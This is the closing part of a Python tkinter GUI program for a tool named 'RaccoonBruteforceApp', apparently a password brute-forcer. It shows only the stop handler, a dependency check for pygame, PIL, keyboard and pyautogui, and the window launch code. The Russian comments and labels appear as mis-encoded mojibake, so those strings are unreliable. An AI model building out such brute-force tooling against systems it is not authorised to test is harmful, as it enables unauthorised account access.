    def stop_bruteforce(self):
        """–û—Å—Ç–∞–Ω–æ–≤–∫–∞ –±—Ä—É—Ç—Ñ–æ—Ä—Å–∞"""
        self.is_running = False
        self.is_paused = False
        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        self.pause_btn.config(state="disabled")
        self.pause_btn.config(text="‚è∏Ô∏è –ü–∞—É–∑–∞")
        self.progress["value"] = 0
        self.play_sound("click")
        logging.info("–ë—Ä—É—Ç—Ñ–æ—Ä—Å –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω")


def check_dependencies():
    """–ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã—Ö –±–∏–±–ª–∏–æ—Ç–µ–∫"""
    try:
        import pygame
        from PIL import Image, ImageTk, ImageSequence, ImageOps
        import keyboard
        import pyautogui
        return True
    except ImportError as e:
        print(f"–û—à–∏–±–∫–∞: {e}\n–£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏:")
        print("pip install pillow pygame keyboard pyautogui")
        return False


if __name__ == "__main__":
    if not check_dependencies():
        sys.exit(1)

    # –°–æ–∑–¥–∞–Ω–∏–µ –∏ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ –æ–∫–Ω–∞
    root = tk.Tk()

    try:
        # –¶–µ–Ω—Ç—Ä–∏—Ä–æ–≤–∞–Ω–∏–µ –æ–∫–Ω–∞
        window_width = 900
        window_height = 650
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        x = (screen_width // 2) - (window_width // 2)
        y = (screen_height // 2) - (window_height // 2)
        root.geometry(f"{window_width}x{window_height}+{x}+{y}")

        # –ó–∞–ø—É—Å–∫ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
        app = RaccoonBruteforceApp(root)
        root.mainloop()
    except Exception as e:
        logging.error(f"–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞: {e}")
        messagebox.showerror("–û—à–∏–±–∫–∞", f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞: {e}")
        sys.exit(1)